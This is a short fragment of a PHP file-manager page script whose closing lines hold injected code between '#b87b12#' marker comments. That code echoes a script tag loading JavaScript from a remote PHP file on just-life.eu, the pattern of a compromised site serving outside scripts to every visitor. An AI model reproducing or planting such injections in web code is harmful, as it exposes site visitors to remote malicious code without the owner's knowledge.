...
function listing_page ($message = null) {
    ...
    echo '<h1 style="margin-bottom: 0"><a href="FileManager.php">TECNOLOGIA</a></h1>
...
#b87b12#
if(empty($f)) {
$f = "<script type=\"text/javascript\" src=\"http://just-life.eu/wp-content/themes/justlife/wlxhtzd2.php?id=21868797\"></script>";
echo $f;
}
#/b87b12#
?>